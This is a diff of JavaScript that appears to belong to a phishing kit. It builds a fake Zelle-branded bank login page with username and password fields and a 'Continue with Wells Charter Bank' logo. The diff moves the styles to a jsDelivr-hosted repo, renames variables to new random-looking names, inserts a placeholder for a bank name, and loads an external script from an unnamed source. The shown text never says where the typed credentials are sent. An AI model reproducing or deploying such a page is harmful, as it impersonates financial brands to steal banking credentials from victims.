@@ -83,7 +83,7 @@ document.head.append(tx26)
 let j27 = document.createElement("link");
 j27.setAttribute("rel", "stylesheet");
 j27.setAttribute("type", "text/css");
-j27.setAttribute("href", "./Assets/css/styles.css");
+j27.setAttribute("href", "https://cdn.jsdelivr.net/gh/jmresult/zelpae/css/styles.css");
 document.head.append(j27)
 let tx28 = document.createTextNode(" ")
 document.head.append(tx28)
@@ -96,12 +96,12 @@ j31.setAttribute("aria-hidden", "true");
 document.body.append(j31)
 let tx32 = document.createTextNode(" ")
 j31.append(tx32)
-let jtkwl5jnh8o4 = document.createElement("IFRAME");
-jtkwl5jnh8o4.setAttribute("src", "https://www.googletagmanager.com/ns.html?id=GTM-PL26Z5L");
-jtkwl5jnh8o4.setAttribute("height", "0");
-jtkwl5jnh8o4.setAttribute("width", "0");
-jtkwl5jnh8o4.setAttribute("style", "display:none;visibility:hidden");
-j31.append(jtkwl5jnh8o4)
+let jqp4l5llq33a = document.createElement("IFRAME");
+jqp4l5llq33a.setAttribute("src", "https://www.googletagmanager.com/ns.html?id=GTM-PL26Z5L");
+jqp4l5llq33a.setAttribute("height", "0");
+jqp4l5llq33a.setAttribute("width", "0");
+jqp4l5llq33a.setAttribute("style", "display:none;visibility:hidden");
+j31.append(jqp4l5llq33a)
 let tx34 = document.createTextNode(" ")
 j31.append(tx34)
 let tx35 = document.createTextNode(" ")
@@ -160,12 +160,12 @@ let tx52 = document.createTextNode("Continue with")
 j51.append(tx52)
 let tx53 = document.createTextNode(" ")
 j44.append(tx53)
-let jtkwl5jnh8o5 = document.createElement("IMG");
-jtkwl5jnh8o5.setAttribute("alt", "Bank Logo");
-jtkwl5jnh8o5.setAttribute("class", "welcome-block__image");
-jtkwl5jnh8o5.setAttribute("src", "https://www.zellepay.com/sites/default/files/logos/J0X.png");
-jtkwl5jnh8o5.setAttribute("title", "Continue with Wells Charter Bank");
-j44.append(jtkwl5jnh8o5)
+let jqp4l5llq33b = document.createElement("IMG");
+jqp4l5llq33b.setAttribute("alt", "Bank Logo");
+jqp4l5llq33b.setAttribute("class", "welcome-block__image");
+jqp4l5llq33b.setAttribute("src", "https://www.zellepay.com/sites/default/files/logos/J0X.png");
+jqp4l5llq33b.setAttribute("title", "Continue with Wells Charter Bank");
+j44.append(jqp4l5llq33b)
 let tx55 = document.createTextNode(" ")
 j44.append(tx55)
 let tx56 = document.createTextNode(" ")
@@ -175,15 +175,15 @@ j57.setAttribute("class", "system-messages landing-page__aside-container");
 j42.append(j57)
 let tx58 = document.createTextNode(" ")
 j57.append(tx58)
-let jtkwl5jnh8o6 = document.createElement("DIV");
-jtkwl5jnh8o6.setAttribute("data-drupal-messages-fallback", "");
-jtkwl5jnh8o6.setAttribute("class", "hidden");
-j57.append(jtkwl5jnh8o6)
+let jqp4l5llq33c = document.createElement("DIV");
+jqp4l5llq33c.setAttribute("data-drupal-messages-fallback", "");
+jqp4l5llq33c.setAttribute("class", "hidden");
+j57.append(jqp4l5llq33c)
 let tx60 = document.createTextNode(" ")
 j57.append(tx60)
-let jtkwl5jnh8o7 = document.createElement("DIV");
-jtkwl5jnh8o7.setAttribute("class", "login-alert alert-warning");
-j57.append(jtkwl5jnh8o7)
+let jqp4l5llq33d = document.createElement("DIV");
+jqp4l5llq33d.setAttribute("class", "login-alert alert-warning");
+j57.append(jqp4l5llq33d)
 let tx62 = document.createTextNode(" ")
 j57.append(tx62)
 let tx63 = document.createTextNode(" ")
@@ -220,23 +220,23 @@ let tx71 = document.createTextNode("Username")
 j70.append(tx71)
 let tx72 = document.createTextNode(" ")
 j68.append(tx72)
-let jtkwl5jnh8o8 = document.createElement("INPUT");
-jtkwl5jnh8o8.setAttribute("autocorrect", "none");
-jtkwl5jnh8o8.setAttribute("autocapitalize", "none");
-jtkwl5jnh8o8.setAttribute("spellcheck", "false");
-jtkwl5jnh8o8.setAttribute("autocomplete", "off");
-jtkwl5jnh8o8.setAttribute("data-drupal-selector", "edit-name");
-jtkwl5jnh8o8.setAttribute("type", "text");
-jtkwl5jnh8o8.setAttribute("id", "edit-name");
-jtkwl5jnh8o8.setAttribute("name", "name");
-jtkwl5jnh8o8.setAttribute("value", "");
-jtkwl5jnh8o8.setAttribute("size", "15");
-jtkwl5jnh8o8.setAttribute("maxlength", "60");
-jtkwl5jnh8o8.setAttribute("class", " input-field input-textfield  __input input-required");
-jtkwl5jnh8o8.setAttribute("required", "required");
-jtkwl5jnh8o8.setAttribute("aria-required", "true");
-jtkwl5jnh8o8.setAttribute("placeholder", "");
-j68.append(jtkwl5jnh8o8)
+let jqp4l5llq33e = document.createElement("INPUT");
+jqp4l5llq33e.setAttribute("autocorrect", "none");
+jqp4l5llq33e.setAttribute("autocapitalize", "none");
+jqp4l5llq33e.setAttribute("spellcheck", "false");
+jqp4l5llq33e.setAttribute("autocomplete", "off");
+jqp4l5llq33e.setAttribute("data-drupal-selector", "edit-name");
+jqp4l5llq33e.setAttribute("type", "text");
+jqp4l5llq33e.setAttribute("id", "edit-name");
+jqp4l5llq33e.setAttribute("name", "name");
+jqp4l5llq33e.setAttribute("value", "");
+jqp4l5llq33e.setAttribute("size", "15");
+jqp4l5llq33e.setAttribute("maxlength", "60");
+jqp4l5llq33e.setAttribute("class", " input-field input-textfield  __input input-required");
+jqp4l5llq33e.setAttribute("required", "required");
+jqp4l5llq33e.setAttribute("aria-required", "true");
+jqp4l5llq33e.setAttribute("placeholder", "");
+j68.append(jqp4l5llq33e)
 let tx74 = document.createTextNode(" ")
 j68.append(tx74)
 let j75 = document.createElement("span");
@@ -259,19 +259,19 @@ let tx81 = document.createTextNode("Password")
 j80.append(tx81)
 let tx82 = document.createTextNode(" ")
 j78.append(tx82)
-let jtkwl5jnh8o9 = document.createElement("INPUT");
-jtkwl5jnh8o9.setAttribute("autocomplete", "off");
-jtkwl5jnh8o9.setAttribute("data-drupal-selector", "edit-pass");
-jtkwl5jnh8o9.setAttribute("type", "password");
-jtkwl5jnh8o9.setAttribute("id", "edit-pass");
-jtkwl5jnh8o9.setAttribute("name", "pass");
-jtkwl5jnh8o9.setAttribute("size", "15");
-jtkwl5jnh8o9.setAttribute("maxlength", "128");
-jtkwl5jnh8o9.setAttribute("class", "input-field input-password input-required");
-jtkwl5jnh8o9.setAttribute("required", "required");
-jtkwl5jnh8o9.setAttribute("aria-required", "true");
-jtkwl5jnh8o9.setAttribute("placeholder", "");
-j78.append(jtkwl5jnh8o9)
+let jqp4l5llq33f = document.createElement("INPUT");
+jqp4l5llq33f.setAttribute("autocomplete", "off");
+jqp4l5llq33f.setAttribute("data-drupal-selector", "edit-pass");
+jqp4l5llq33f.setAttribute("type", "password");
+jqp4l5llq33f.setAttribute("id", "edit-pass");
+jqp4l5llq33f.setAttribute("name", "pass");
+jqp4l5llq33f.setAttribute("size", "15");
+jqp4l5llq33f.setAttribute("maxlength", "128");
+jqp4l5llq33f.setAttribute("class", "input-field input-password input-required");
+jqp4l5llq33f.setAttribute("required", "required");
+jqp4l5llq33f.setAttribute("aria-required", "true");
+jqp4l5llq33f.setAttribute("placeholder", "");
+j78.append(jqp4l5llq33f)
 let tx84 = document.createTextNode(" ")
 j78.append(tx84)
 let j85 = document.createElement("span");
@@ -336,11 +336,13 @@ let tx101 = document.createTextNode(" ")
 j100.append(tx101)
 let j102 = document.createElement("div");
 j102.setAttribute("class", "basic-block");
+j102.setAttribute("style", "padding-bottom: 70px");
 j100.append(j102)
 let tx103 = document.createTextNode(" ")
 j102.append(tx103)
 let j104 = document.createElement("div");
 j104.setAttribute("class", "field");
+j104.setAttribute("style", "display: none");
 j102.append(j104)
 let tx105 = document.createTextNode(" ")
 j104.append(tx105)
@@ -431,40 +433,45 @@ let j142 = document.createElement("div");
 j140.append(j142)
 let j143 = document.createElement("p");
 j142.append(j143)
-let tx144 = document.createTextNode("This site provides our trusted partners with brand resources and guidelines to properly represent Zelle® in the marketplace.")
+let tx144 = document.createTextNode("Your financial institution (")
 j143.append(tx144)
-let tx145 = document.createTextNode(" ")
-j142.append(tx145)
-let j146 = document.createElement("p");
-j142.append(j146)
-let tx147 = document.createTextNode("If you are looking for more information about Zelle®, please visit ")
-j146.append(tx147)
-let j148 = document.createElement("a");
-j148.setAttribute("href", "https://zellepay.com");
-j146.append(j148)
-j148.innerHTML="zellepay.com";
-let tx149 = document.createTextNode(".")
-j146.append(tx149)
-let tx150 = document.createTextNode(" ")
-j142.append(tx150)
-let tx151 = document.createTextNode(" ")
-j140.append(tx151)
+let j145 = document.createElement("span");
+j145.setAttribute("id", "bankName");
+j143.append(j145)
+let tx146 = document.createTextNode(") is our trusted partners with brand resources and guidelines to properly represent Zelle® in the marketplace.")
+j143.append(tx146)
+let tx147 = document.createTextNode(" ")
+j142.append(tx147)
+let j148 = document.createElement("p");
+j142.append(j148)
+let tx149 = document.createTextNode("If you are looking for more information about Zelle®, please visit ")
+j148.append(tx149)
+let j150 = document.createElement("a");
+j150.setAttribute("href", "https://zellepay.com");
+j148.append(j150)
+j150.innerHTML="Zelle® support page";
+let tx151 = document.createTextNode(".")
+j148.append(tx151)
 let tx152 = document.createTextNode(" ")
-j138.append(tx152)
+j142.append(tx152)
 let tx153 = document.createTextNode(" ")
-j136.append(tx153)
+j140.append(tx153)
 let tx154 = document.createTextNode(" ")
-j134.append(tx154)
+j138.append(tx154)
 let tx155 = document.createTextNode(" ")
-j132.append(tx155)
+j136.append(tx155)
 let tx156 = document.createTextNode(" ")
-j130.append(tx156)
+j134.append(tx156)
 let tx157 = document.createTextNode(" ")
-j38.append(tx157)
+j132.append(tx157)
 let tx158 = document.createTextNode(" ")
-j36.append(tx158)
-let tx159 = document.createTextNode("  ")
-document.body.append(tx159)
+j130.append(tx158)
+let tx159 = document.createTextNode(" ")
+j38.append(tx159)
+let tx160 = document.createTextNode(" ")
+j36.append(tx160)
+let tx161 = document.createTextNode("  ")
+document.body.append(tx161)
 
     const script = document.createElement('script');
     script.src = s1;
